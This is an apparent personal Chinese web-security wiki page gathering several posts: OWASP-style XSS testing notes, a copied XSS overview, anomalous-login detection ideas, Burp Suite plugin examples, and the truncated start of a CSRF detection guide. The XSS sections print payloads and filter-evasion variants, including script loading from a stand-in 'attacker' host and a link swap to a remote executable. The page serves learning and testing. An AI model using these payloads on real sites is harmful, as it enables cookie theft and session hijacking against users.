<!doctype html>
<html class="no-js" lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="bookmark" href="https://raw.githubusercontent.com/AlShelley/lonelyorWiki/master/asset/img/favicon.ico" type="images/x-icon"/>
    <link rel="shortcut icon" href="https://raw.githubusercontent.com/AlShelley/lonelyorWiki/master/asset/img/favicon.ico" type="images/x-icon"/>

    <title>
    
  Web安全 - lonelyorWiki
  
  </title>
  
  
  <link href="atom.xml" rel="alternate" title="lonelyorWiki" type="application/atom+xml">
    <link rel="stylesheet" href="asset/css/foundation.min.css" />
    <link rel="stylesheet" href="asset/css/docs.css" />
    <script src="asset/js/vendor/modernizr.js"></script>
    <script src="asset/js/vendor/jquery.js"></script>
  <script src="asset/highlightjs/highlight.pack.js"></script>
  <link href="asset/highlightjs/styles/github.css" media="screen, projection" rel="stylesheet" type="text/css">
  <script>hljs.initHighlightingOnLoad();</script>
<script type="text/javascript">
  function before_search(){
    var searchVal = 'site:www.lonelyor.org/lonelyorWiki ' + document.getElementById('search_input').value;
    document.getElementById('search_q').value = searchVal;
    return true;
  }
</script>
  </head>
  <body class="antialiased hide-extras">
    
    <div class="marketing off-canvas-wrap" data-offcanvas>
      <div class="inner-wrap">


<nav class="top-bar docs-bar hide-for-small" data-topbar>


  <section class="top-bar-section">
  <div class="row">
      <div style="position: relative;width:100%;"><div style="position: absolute; width:100%;">
        <ul id="main-menu" class="left">
        
        <li id=""><a target="_self" href="index.html">首页</a></li>
        
        <li id=""><a target="_self" href="archives.html">归档</a></li>
        
        <li id=""><a target="_self" href="beautiful.html">惊鸿</a></li>
        
        <li id=""><a target="_self" href="ruby.html">流光</a></li>
        
        <li id=""><a target="_self" href="search.html">北斗</a></li>
        
        <li id=""><a target="_self" href="lose.html">失乐园</a></li>
        
        <li id=""><a target="_self" href="about.html">关于</a></li>
        
        </ul>

        <ul class="right" id="search-wrap">
          <li>
<form target="_blank" onsubmit="return before_search();" action="https://google.com/search" method="get">
    <input type="hidden" id="search_q" name="q" value="" />
    <input tabindex="1" type="search" id="search_input"  placeholder="Search"/>
</form>
</li>
          </ul>
      </div></div>
  </div>
  </section>

</nav>

        <nav class="tab-bar show-for-small">
  <a href="javascript:void(0)" class="left-off-canvas-toggle menu-icon">
    <span> &nbsp; lonelyorWiki</span>
  </a>
</nav>

<aside class="left-off-canvas-menu">
      <ul class="off-canvas-list">
        
        <li><a target="_self" href="index.html">首页</a></li>
        
        <li><a target="_self" href="archives.html">归档</a></li>
        
        <li><a target="_self" href="beautiful.html">惊鸿</a></li>
        
        <li><a target="_self" href="ruby.html">流光</a></li>
        
        <li><a target="_self" href="search.html">北斗</a></li>
        
        <li><a target="_self" href="lose.html">失乐园</a></li>
        
        <li><a target="_self" href="about.html">关于</a></li>
        

    <li><label>Categories</label></li>

        
            <li><a href="%E7%B3%BB%E7%BB%9F.html">系统</a></li>
        
            <li><a href="%E7%BD%91%E7%BB%9C.html">网络</a></li>
        
            <li><a href="%E5%BC%80%E5%8F%91.html">开发</a></li>
        
            <li><a href="%E5%B7%A5%E5%85%B7.html">工具</a></li>
        
            <li><a href="%E6%95%B0%E6%8D%AE%E5%BA%93.html">数据库</a></li>
        
            <li><a href="Web%E5%AE%89%E5%85%A8.html">Web安全</a></li>
        
            <li><a href="%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html">风花雪月</a></li>
        
            <li><a href="%E6%98%9F%E7%81%AB%E6%B5%81%E8%90%A4.html">星火流萤</a></li>
         

      </ul>
    </aside>

<a class="exit-off-canvas" href="#"></a>


        <section id="main-content" role="main" class="scroll-container">
        
       

 <script type="text/javascript">
	$(function(){
		$('#menu_item_index').addClass('is_active');
	});
</script>
<div class="row">
	<div class="large-8 medium-8 columns">
		<div class="markdown-body home-categories">
		
			<div class="article">
                <a class="clearlink" href="15446888524769.html">
                
                  <h1>xss检测</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<h2 id="toc_0">反射型xss</h2>

<p>1、检测输入向量，确定所有web应用程序的用户定义变量以及如何输入他们，包括显而易见的、http参数、post数据、隐藏的表单字段值等。</p>

<p>2、分析每个输入向量并注入payload以检测潜在的漏洞。</p>

<p>3、分析结果并确定是否存在具有实际影响的漏洞。</p>

<ul>
<li><p>没有任何防御的情况下</p>
<p>直接访问即会弹窗</p>
<pre class="line-numbers"><code class="language-http">http://example.com/index.php?user=&lt;script&gt;alert(123)&lt;/script&gt;
</code></pre>
<p>下面这段代码会导致用户单击测试人员提供的链接，即葱他控制的站点下载文件test.exe。</p>
<pre class="line-numbers"><code class="language-http">http://example.com/index.php?user=&lt;script&gt;window.onload = function() {var AllLinks=document.getElementsByTagName(&quot;a&quot;); 
AllLinks[0].href = &quot;http://badexample.com/test.exe&quot;; }&lt;/script&gt; 
</code></pre></li>
<li><p>标记属性值</p>
<p>有些情况下可以不使用<code>&lt;script&gt;</code>标签的情况下执行xss漏洞利用，甚至不使用通常过滤的 &lt;&gt; 和 / 等字符。</p>
<p>例如，Web应用程序可以使用用户输入值来填充属性，如以下代码所示：</p>
<pre class="line-numbers"><code class="language-javascript">&lt;input type=&quot;text&quot; name=&quot;state&quot; value=&quot;INPUT_FROM_USER&quot;&gt;
</code></pre>
<p>然后攻击者可以提交以下代码：</p>
<pre class="line-numbers"><code class="language-javascript">&quot; onfocus=&quot;alert(document.cookie)
</code></pre></li>
<li><p>不同的语法或编码</p>
<p>通常可以使用这种方法来绕过一些过滤器</p>
<p>代码示例：</p></li>
</ul>

<pre class="line-numbers"><code class="language-javascript">  &quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script &gt;
  &quot;&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;
  &quot;%3cscript%3ealert(document.cookie)%3c/script%3e
</code></pre>

<ul>
<li><p>绕过非递归过滤器</p>
<p>有时，过滤器只清理一次，而不是递归执行</p>
<pre class="line-numbers"><code class="language-javascript">&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;
</code></pre></li>
<li><p>包含外部脚本</p>
<p>现在假设目标站点的开发人员实现了以下代码来保护输入不包含外部脚本：</p></li>
</ul>

<pre class="line-numbers"><code class="language-text">&lt;?
   $re = &quot;/&lt;script[^&gt;]+src/i&quot;;

   if (preg_match($re, $_GET[&#39;var&#39;])) 
   {
      echo &quot;Filtered&quot;;
      return; 
   }
   echo &quot;Welcome &quot;.$_GET[&#39;var&#39;].&quot; !&quot;;
?&gt;
</code></pre>

<p>这种方案中，有一个正则表达式检测是否在 <code>&lt;script</code> 和 <code>&gt;</code> 之间插入了除 src 之外的任何其他内容。这对</p>

<pre class="line-numbers"><code class="language-javascript">&lt;script src=&quot;http://attacker/xss.js&quot;&gt;&lt;/script&gt;
</code></pre>

<p>这种表达式特别有效。</p>

<p>但是可以使用以下方式绕过：</p>

<pre class="line-numbers"><code class="language-javascript">http://example/?var=&lt;SCRIPT%20a=&quot;&gt;&quot;%20SRC=&quot;http://attacker/xss.js&quot;&gt;&lt;/SCRIPT&gt; 
</code></pre>

<ul>
<li>HTTP参数污染(HPP)</li>
</ul>

<p>这种规避技术包括在具有相同名称的多个参数之间拆分攻击向量。对每个参数值的操纵取决于每个web技术如何解析这些参数，因此这种规避不是总是可行的。</p>

<p>定向攻击代码：</p>

<pre class="line-numbers"><code class="language-javascript">http://example/page.php?param=&lt;script&gt;[...]&lt;/script&gt;
</code></pre>

<p>使用HPP攻击：</p>

<pre class="line-numbers"><code class="language-javascript">http://example/page.php?param=&lt;script&amp;param=&gt;[...]&lt;/&amp;param=script&gt;
</code></pre>

<ul>
<li>通常使用burp的主动扫描，即可检测出大部分情况下的反射型xss，而存储型xss目前还没有比较好的检测方法。</li>
</ul>

<h2 id="toc_1">存储型xss</h2>

<ul>
<li><p>输入表格</p></li>
<li><p>存储型xss能不能成功主要取决于能不能规避过滤器。</p></li>
<li><p>上传文件</p>
<p>如果web应用程序允许文件上传，那么检查是否可以上载html内容就很重要。如果允许html或者txt文件，则可以在上载的文件中注入xss有效载荷。还应该验证文件上载是否允许设置任意MIME类型。</p>
<p>考虑以下用于文件上传的 HTTP POST 请求：</p>
<pre class="line-numbers"><code class="language-http">POST /fileupload.aspx HTTP/1.1
[…]<br/>
Content-Disposition: form-data; name=&quot;uploadfile1&quot;; filename=&quot;C:\Documents and Settings\test\Desktop\test.txt&quot;<br/>
Content-Type: text/plain<br/>
test
</code></pre>
<p>这种设计缺陷可以在浏览器 MIME 错误处理攻击中利用。例如，像jpg、gif这样的文件可以包含在浏览器加载时执行xss的有效载荷。当images、gif这样的图像的MIME类型可以设置为text/html时，这是可能的。这种情况下，客户端浏览器将文件视为HTML。</p>
<p>HTTP POST 请求伪造:</p>
<pre class="line-numbers"><code class="language-http">Content-Disposition: form-data; name=&quot;uploadfile1&quot;; filename=&quot;C:\Documents and Settings\test\Desktop\test.gif&quot;
Content-Type: text/html<br/>
&lt;script&gt;alert(document.cookie)&lt;/script&gt;
</code></pre></li>
<li><p>测试应用程序如何处理用户输入</p>
<p>可以执行以下步骤:</p>
<ul>
<li>使用前端应用程序并输入带有特殊/无效字符的输入</li>
<li>分析应用程序响应</li>
<li>确定输入验证控件存在</li>
<li>访问后端系统并检查输入是否存储以及如何存储</li>
<li>分析源代码并了解应用程序如何呈现存储的输入</li>
</ul></li>
<li><p>如果源码可用，则应分析输入表单中使用的所有变量，特别是PHP、ASP和JSP等编程语言使用预定义的变量/函数来存储来自HTTP GET和POST请求的输入。</p>
<p>下表总结了在分析源代码时要查看的一些特殊变量和函数：</p>
<table>
<thead>
<tr>
<th>语言</th>
<th>PHP</th>
<th>ASP</th>
<th>JSP</th>
</tr>
</thead>
<tbody>
<tr>
<td>变量函数</td>
<td>$_GET —— HTTP GET变量</td>
<td>Request.QueryString —— HTTP GET</td>
<td>doGet, doPost servlets —— HTTP GET 和 POST</td>
</tr>
<tr>
<td></td>
<td>$_POST—— HTTP POST变量</td>
<td>Request.Form ——  HTTP POST</td>
<td>request.getParameter —— HTTP GET/POST 变量</td>
</tr>
<tr>
<td></td>
<td>$_REQUEST —— HTTP POST, GET 和 COOKIE变量</td>
<td>Server.CreateObject —— 用来上传文件</td>
<td></td>
</tr>
<tr>
<td></td>
<td>$_FILES —— HTTP文件上传变量</td>
<td></td>
<td></td>
</tr>
</tbody>
</table></li>
</ul>

<h2 id="toc_2">DOM型xss</h2>

<ul>
<li>举个例子：</li>
</ul>

<p>假如我们访问一个页面: <code>http://www.example.com/welcome.html</code></p>

<pre class="line-numbers"><code class="language-markup">&lt;HTML&gt;
&lt;TITLE&gt;Welcome!&lt;/TITLE&gt;
Hi
&lt;SCRIPT&gt;
var pos=document.URL.indexOf(&quot;name=&quot;)+5;
document.write(document.URL.substring(pos,document.URL.length));
&lt;/SCRIPT&gt;
&lt;BR&gt;
Welcome to our system
…
&lt;/HTML&gt;
</code></pre>

<p>此页面将用于欢迎用户，例如:</p>

<p><code>http://www.example.com/welcome.html?name=lonelyor</code></p>

<p>但是请求如下: </p>

<p><code>http://www.example.com/welcome.html?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>

<p>这样会触发dom型xss的条件。让我们看看为什么:</p>

<p>当受害者的浏览器像 <code>www.example.con</code> 发送http请求，并接受上述(静态)html页面。然后受害者的浏览器会开始将html解析为dom，dom包含一个名为 document 的对象，该对象包含一个名为 URL 的属性，并且此属性使用当前页面的 URL 填充来作为 dom 创建的一部分。当解析器达到javascript代码时，它会执行</p>

<pre class="line-numbers"><code class="language-javascript">var pos=document.URL.indexOf(&quot;name=&quot;)+5;
document.write(document.URL.substring(pos,document.URL.length));
</code></pre>

<p>并修改页面的原始html。这种情况下，代码引用 document.URL，因此，此name字符串的一部分将嵌入在html中并立即解析，这时会在同一页面执行 <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，因此是xss条件。</p>

<ul>
<li><p>注意</p>
<ul>
<li>恶意代码在任何时候都没有嵌入到原始html页面中(这与反射和存储型不同)</li>
<li>此漏洞仅在浏览器不修改url字符时才有效。当url不直接在地址栏中输入时，火狐会自动编码 document.url 中的 &lt;和&gt;(分别为 %3C 和 %3E )，因此火狐不易收到攻击。IE6.0因为不编码这些所以容易被攻击。当然，直接嵌入HTML只是一个攻击挂载点，有各种场景不需要&lt;和&gt;，因此Mozilla通常不能免受此攻击。</li>
</ul></li>
<li><p>规避服务器检测</p>
<p>显然上面的方法还是把payload发送到了服务器，这样后端还是可以检测到，不过，我们可以规避这种检测。</p>
<p>新的payload如下:</p>
<p><code>http://www.example.com/welcome.html#name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
<p>注意文件后面的数学符号(#)，他告诉浏览器，#后面的内容都是片段，即不是查询的一部分，火狐和IE6.0不会将片段发送到服务器，因此服务器将看到相当于<code>http://www.example.com/welcome.html</code>，所以服务器不会看到有效载荷。</p></li>
</ul>

<h2 id="toc_3">参考链接</h2>

<p><a href="https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)">反射性xss</a></p>

<p><a href="https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)">存储型xss</a></p>

<p><a href="https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)">dom型xss</a></p>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 16:14 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15446876559011.html">
                
                  <h1>xssing.org跨站的艺术</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<blockquote>
<p>这个网站太棒了，强烈推荐阅读<br/>
<a href="https://xssing.org/%E9%A6%96%E9%A1%B5">xssing.org跨站的艺术</a>若不能直接访问请使用科学上网工具。</p>
</blockquote>

<h1 id="toc_0">什么是XSS？</h1>

<h1 id="toc_1">概述</h1>

<p>XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，比较合适的方式应该叫做跨站脚本攻击。跨站点脚本（XSS）攻击是一种注射型攻击，攻击者在可信的网页中嵌入恶意代码，用户访问可信网页时触发XSS而被攻击.</p>

<p>攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致XSS。</p>

<p>攻击者可以使用XSS发送恶意脚本给没有任何防备的用户。终端用户浏览器无法知道不应该信任叫嗯,而是执行了该脚本。因为它认为脚本来自可信的源,恶意脚本可以访问任何Cookies,会话令牌,或其浏览器和网站保留使用的他敏感信息。这些脚本甚至可以重写HTML页面的内容。更多的内容可以阅读本站其他内容。</p>

<h1 id="toc_2">详细介绍</h1>

<p>跨站脚本攻击在以下情况出现:</p>

<ol>
<li>Web应用程序通过不可信的来源进行数据输入，最常见是的Web请求(输入，比如如GET访问某Web应用的url，通过参数提交数据,比如提交input=<script>alert(0);&lt;/ script&gt;)。</li>
<li>恶意数据包含在动态内容内在没有进行校验的情况下发送给用户(输出，比如提交的input的值在没有校验的情况下，用户访问页面，浏览器直接渲染了input的值执行了JS，导致弹窗)。</li>
</ol>

<p>发送到Web浏览器的恶意内容通常是以JavaScript代码的形式，当然也可以包括HTML，Flash或任何浏览器可以执行的其他类型的代码。基于XSS的攻击种类几乎是无限的，但它们通常包括发送隐私数据给攻击者，如cookies或其他会话信息；重定向受害者访问攻击者控制的页面；或者利用网站漏洞在用户机器上执行其他恶意操作。</p>

<h2 id="toc_3">存储型和反射型XSS攻击</h2>

<p>XSS攻击通常可以分为两类：存储型和反射型（也称持久性和非持久性）。还有第三种相对少为认知的XSS攻击类型，叫做DOM XSS ,具体可以点击这里阅读。</p>

<p>同时最近还有一种XSS攻击类型被提出来，突变XSS，不过个人觉得突变XSS不合适作为第四种XSS攻击类型，因为这种突变XSS可以出现在以上三种类型的XSS里，不过比较特殊，我们同样也在这里进行单独介绍（Fooying注）。</p>

<h2 id="toc_4">存储型XSS攻击</h2>

<p>存储型攻击是指那些被注入脚本将被永久保存在目标服务器上，比如在数据库中，在消息板块，访客日志，注释字段等。受害人请求存储信息时，将再次检索到恶意脚本(比如，在留言板提交XSS攻击代码，会存储到数据库，当再次访问留言板会请求数据库中的留言信息，就会连同XSS攻击代码一起检索出来在页面展示，使得受害者再次被攻击)。存储型XSS有时也被称为持久性或Type-I XSS。</p>

<h2 id="toc_5">反射型XSS攻击</h2>

<p>反射型攻击是指那些被注入脚本反射出Web服务器，比如在一个错误信息、搜索结果，或者其他任何的包括一些或所有的输入作为请求的一部分发送到服务器的响应。反射型攻击是通过其他途径送达到受害者，比如一封邮件的内容，或者一些其他的网站。当用户被诱骗点击一个恶意链接，提交一个特制的表单，甚至只是浏览到恶意网站，被注入的脚本行进到有漏洞的网站，将攻击反射回用户浏览器。然后浏览器执行代码，因为它来自于一个“可信”的服务器。反射型XSS有时也被称为非持久性或Type-II XSS.</p>

<h2 id="toc_6">其他类型的XSS漏洞的</h2>

<p>除了反射型和存储型XSS,其他类型的XSS，Amit Klein在2005年发现DOM XSS。除此之外，推荐关于XSS分类描述的文章：XSS分类，它涵盖了所有这些方面的XSS，组成了矩阵，存储vs反射型XSS，以及服务端和客户端XSS，DOM XSS是客户端XSS。</p>

<h2 id="toc_7">XSS攻击结果</h2>

<p>无论是存储型还是反射型（或DOM XSS）的攻击结果都是相同的。不同的是Payload如何有效的到达服务器。不要错误的认为，一个“read only”或“brochureware”网站不容易受到严重的反射型XSS攻击。XSS可以引起终端用户的各种问题，包括不同的严重成都。最严重的XSS攻击涉及用户的会话cookie的披露，使攻击者劫持用户的会话和接管帐户。其他破坏性攻击包括终端用户的文件披露，特洛伊木马程序的安装，将用户重定向到其他网页或网站，或修改内容介绍。XSS漏洞允许攻击者修改新闻稿或新闻项目可以影响一个公司的股票价格或减少消费者的信心。一个药品网站XSS漏洞可能允许攻击者修改剂量信息导致过量。更多关于这些类型的攻击请看内容欺骗。</p>

<h2 id="toc_8">如何确定存在漏洞</h2>

<p>XSS漏洞比较难以识别和从Web应用程序中删除。发现漏洞的最佳方法是进行的代码的安全审计，搜索一个HTTP请求中可能进入HTML输出的所有输入点。值得注意的是，各种不同的HTML标签可以用来发送一个恶意的JavaScript。Nessus, Nikto以及其他的一些扫描器，可以用来扫描检测XSS，不过效果有限。如果一个网站的某部分存在漏洞，那么很有可能还有其他的问题。</p>

<h2 id="toc_9">如何防范XSS</h2>

<p>XSS防御的相关内容位于OWASP XSS防范备忘录 .</p>

<p>另外，最主要的是关闭掉你所有Web服务对HTTP回调的支持。攻击者可以窃取cookie数据通过JavaScript，即使document.cookie被禁用或不支持客户端。用户可以在论坛发布一个恶意脚本，当其他人点击链接，异步回调请求就会被触发，用来收集来自服务器的用户的cookie信息，然后发送到另一个接收地址，这样攻击者就可以进行一个会话劫持攻击。关闭掉你所有Web服务对HTTP回调的支持是很容易的。</p>

<p>OWASP ESAPI project已经开发了一套可重用的安全组件。包含多种编程语言，包括验证和转义来防止参数篡改和XSS攻击注射。此外，OWASP WebGoat Project训练应用，有跨站点脚本和数据编码的训练经验。</p>

<h2 id="toc_10">XSS语句</h2>

<p><strong>属性中使用脚本的XSS</strong><br/>
XSS攻击可能在非<script></script> 标签中发生. 其他标签也可以做同样事，比如:</p>

<p><code>&lt;body onload=alert(&#39;test1&#39;)&gt;</code><br/>
或其他属性，如:onmouseover,onerror.onmouseover</p>

<p><code>&lt;b onmouseover=alert(&#39;Wufff!&#39;)&gt;click me!&lt;/b&gt;</code><br/>
onerror</p>

<p><code>&lt;img src=&quot;http://url.to.file.which/not.exist&quot; onerror=alert(document.cookie);&gt;</code></p>

<p><strong>利用XSS脚本通过编码的URI方案</strong><br/>
如果我们需要绕过Web应用过滤器，我们可以尝试编码字符串，比如：a=A (UTF-8),在img标签中使用：</p>

<p><code>&lt;IMG SRC=jAvascript:alert(&#39;test2&#39;)&gt;</code><br/>
有许多不同的UTF-8编码符号可以给我们更多的可能性。</p>

<p><strong>XSS利用代码的编码</strong><br/>
在META标签，我们可以对我们的脚本进行base64编码，这样就不用输入alert()字符。这个方法的更多信息参考RFC 2397</p>

<p><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; <br/>
CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg&quot;&gt;</code></p>

<p>这些以及其他的例子可以在OWASP XSS Filter Evasion Cheat Sheet查看。这是一个真正的备用XSS攻击代码的百科</p>

<h1 id="toc_11">例子</h1>

<p>跨站点脚本攻击可能发生在任何地方，可能是恶意用户被允许发送非规范内容到一个可信的网站给其他合法用户。最常见的例子发生在网站公告板，提供基于Web的邮件列表的功能</p>

<h2 id="toc_12">例子 1</h2>

<p>The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user. 下面的JSP代码块从一个HTTP请求读取employee ID, eid，并展示给用户。</p>

<pre class="line-numbers"><code class="language-text">    &lt;% String eid = request.getParameter(&quot;eid&quot;); %&gt; 
    ... 
    Employee ID: &lt;%= eid %&gt;
</code></pre>

<p>如果eid仅包含标准字母数字文本，则此示例中的代码可正常运行。如果eid具有包含元字符或源代码的值，则代码将在Web浏览器显示HTTP响应时执行。</p>

<p>最初，这似乎不是一个漏洞。毕竟，为什么有人会输入导致恶意代码在自己的计算机上运行的URL？真正的危险是攻击者会创建恶意URL，然后使用电子邮件或社交工程技巧诱使受害者访问URL的链接。当受害者点击该链接时，他们会无意中通过易受攻击的Web应用程序将恶意内容反映回自己的计算机。这种利用易受攻击的Web应用程序的机制称为反射型XSS。</p>

<h2 id="toc_13">例子 2</h2>

<p>The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee&#39;s name.</p>

<pre class="line-numbers"><code class="language-jsp">    &lt;%...
     Statement stmt = conn.createStatement(); 
     ResultSet rs = stmt.executeQuery(&quot;select * from emp where id=&quot;+eid); 
     if (rs != null) { 
      rs.next(); 
      String name = rs.getString(&quot;name&quot;); 
    %&gt; 
    Employee Name: &lt;%= name %&gt;
```

以上，是首页的部分内容，首页还有很多的参考链接，这些链接都非常有价值，可是不好copy，所以请读者自行前往原网站欣赏。
</code></pre>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 15:54 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15446875268619.html">
                
                  <h1>异常登录检测</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<p>异常登录功能用来检测服务器上的登录行为。<br/>
非常用地的登录行为告警（这个常用登陆地可以作为个人信息的一部分来由用户设置；或者收集第一次成功登录时的公网ip，然后将此ip地址设置位常用登陆地，从该时间往后顺延24小时内的所有公网登录地也会被记为常用登陆地，当超过24小时候，所有不在常用登陆地的登录行为均视为异地登录警告。当某个ip被判定为异地登录时，仅第一次登录行为进行告警，如果成功登录6次或以上，则默认将此ip的地点记录为常用登录地。）<br/>
非常用登录ip告警<br/>
非常用登录时间告警<br/>
非常用登录账号告警（同一时间段内超多次登录同一账号、同一时间段内不同地理位置登录账号、同一时间段内多个ip登录同一账号、不同设备登录同一账号、同一设备不同ip登录同一账号）</p>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 15:52 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15446874145620.html">
                
                  <h1>burpsuite插件编写之官方代码示例解读</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<blockquote>
<p>description: 分析burpsuite官方提供的示例代码，以此来学习插件编写。</p>
</blockquote>

<h2 id="toc_0">HelloWorld</h2>

<p>废话不多说，直接上代码！</p>

<pre class="line-numbers"><code class="language-python">from burp import IBurpExtender
from java.io import PrintWriter
from java.lang import RuntimeException

# 上面import的第一句是所有burp插件都必须有的
# 下面开始创建一个burp插件的类来实现插件
class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, callbacks):
        # 创建插件名
        callbacks.setExtensionName(&quot;HelloWorld extension&quot;)
        # 获取输出和错误流
        stdout = PrintWriter(callbacks.getStdout(), True)
        stderr = PrintWriter(callbacks.getStderr(), True)
        # 在输出流和错误流中插入消息
        stdout.println(&quot;Hello output&quot;)
        stderr.println(&quot;Hello errors&quot;)
        # 将消息插入burp的alert警报标签中
        callbacks.issueAlert(&quot;Hello alerts&quot;)
        # 抛出将出现在错误流中的异常
        raise RuntimeException(&quot;Hello exception&quot;)
</code></pre>

<p>现在开始来说几个坑：<br/>
1、插件最好尽量放在英文路径，不然可能会报错<br/>
2、编写代码前指定编码(如：# -<em>- coding:utf8 -</em>-)<br/>
3、raise RuntimeException(&quot;Hello exception&quot;) 这行代码我没看懂是要干嘛的，反正写了之后Errors就报错，不想看的话就注释掉好了。</p>

<h2 id="toc_1">event_listeners 事件监听器</h2>

<pre class="line-numbers"><code class="language-python">#!/usr/bin/python3
# -*- coding:utf-8 -*-

from burp import IBurpExtender
from burp import IHttpListener
from burp import IProxyListener
from burp import IScannerListener
from burp import IExtensionStateListener
from java.io import PrintWriter

class BurpExtender(IBurpExtender, IHttpListener, IProxyListener, IScannerListener, IExtensionStateListener):
    def registerExtenderCallbacks(self, callbacks):
        # 保持对回调对象的引用
        self._callbacks = callbacks
        # 创建插件名
        callbacks.setExtensionName(&quot;Event Listeners&quot;)
        # 获取输出流
        self._stdout = PrintWriter(callbacks.getStdout(), True)
        # 注册为http监听器
        callbacks.registerHttpListener(self)
        # 注册为proxy监听器
        callbacks.registerProxyListener(self)
        # 注册为scanner监听器
        callbacks.registerScannerListener(self)
        # 注册为扩展插件状态监听器
        callbacks.registerExtensionStateListener(self)
    # 下面几个函数各自实现监听
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        self._stdout.println(
            (&quot;HTTP request to &quot; if messageIsRequest else &quot;HTTP response from&quot;) +
            messageInfo.getHttpService().toString() +
            &quot;[&quot; + self._callbacks.getToolName(toolFlag) + &quot;]&quot;
        )

    def processProxyMessage(self, messageIsRequest, message):
        self._stdout.println(
            (&quot;Proxy request to &quot; if messageIsRequest else &quot;Proxy response from&quot;) +
            message.getMessageInfo.getHTTPService().toString()
        )

    def newScanIssue(self, issue):
        self._stdout.prinln(&quot;New scan issue &quot; + issue.getIssueName())

    def extensionUnloaded(self):
        self._stdout.println(&quot;Extension was unloaded&quot;)
</code></pre>

<p>我是没搞懂这个插件做了什么，诶无所谓，也就是多敲敲代码，熟悉熟悉感觉。</p>

<h2 id="toc_2">traffic_redirector 流量重定向</h2>

<pre class="line-numbers"><code class="language-python">#!/usr/bin/python3
# -*- coding:utf-8 -*-

from burp import IBurpExtender
from burp import IHttpListener

HOST_FROM = &quot;www.baidu.com&quot;
HOST_TO = &quot;www.zhihu.com&quot;

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        # 获取扩展helpers对象
        self._helpers = callbacks.getHelpers()
        # 设置扩展名
        callbacks.setExtensionName(&quot;Traffic redirector&quot;)
        # 将自己注册为HTTP侦听器
        callbacks.registerHttpListener(self)

    def processHttpMessage(self, toolsFlag, messageIsRequest, messageInfo):
        # 只获取请求
        if not messageIsRequest:
            return
        # 获取http服务的请求
        httpService = messageInfo.getHttpService()
        # 如果主机是HOST_FROM则将它改成HOST_TO
        if (HOST_FROM == httpService.getHost()):
            messageInfo.setHttpService(self._helpers.buildHttpService(HOST_TO,
                httpService.getPort(), httpService.getProtocol()))
</code></pre>

<p>这个插件简单来说就是，把请求中的host部分修改掉。比如上述代码会监听所有host为百度的请求，一旦出现，就会把host改成知乎。</p>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 15:50 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15446869314706.html">
                
                  <h1>xss、csrf、sql注入快速检测方法</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<h2 id="toc_0">CSRF跨站请求伪造</h2>

<ul>
<li>原理<br/>
攻击者在受害者不知情的情况下，以受害者的名义伪造请求发送给受攻击的站点，从而在未授权的情况下执行在权限保护之下的操作。<br/>
CSRF攻击的对象是那些可以直接产生数据改变的服务，而对于读取数据的服务，则不需要进行 CSRF 的保护。<br/></li>
</ul>

<hr/>

<ul>
<li>检测方法<br/>
1.查看重要操作接口提交的请求中是否包含 csrf_token<br/>
